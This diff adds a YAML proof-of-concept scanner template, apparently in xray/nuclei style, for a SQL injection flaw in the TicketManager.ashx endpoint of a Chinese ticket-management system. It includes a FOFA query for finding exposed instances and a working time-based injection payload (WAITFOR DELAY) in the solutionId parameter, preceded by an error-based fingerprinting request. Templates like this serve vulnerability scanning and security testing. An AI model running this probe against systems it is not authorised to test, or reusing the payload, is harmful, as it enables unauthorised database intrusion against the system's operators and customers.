@@ -1,0 +1,27 @@
+id: poc-yaml-zckx-ticketmanager-ashx-sqli
+info:
+  name: 中成科信票务管理系统 TicketManager.ashx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 中城科信票务管理平台
+  fofa: body="SystemManager/SoftwareLicense.htm"
+variables:
+  t1: random_int(4,9)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /SystemManager/Api/TicketManager.ashx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: Method=GetReServeOrder
+  expression: status_code == 500 && contains(body,"命名空间") && contains(body,"超出范围")
+    && contains(body,"SqlException")
+- method: POST
+  path: /SystemManager/Api/TicketManager.ashx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: Method=GetReServeOrder&solutionId=1' WAITFOR DELAY '0:0:{{.t1}}'--
+  expression: status_code == 200 && contains(body,`{"Table":[]}`) && !contains(body,"<")
+    && duration > t1 && duration < t2
+transport: http
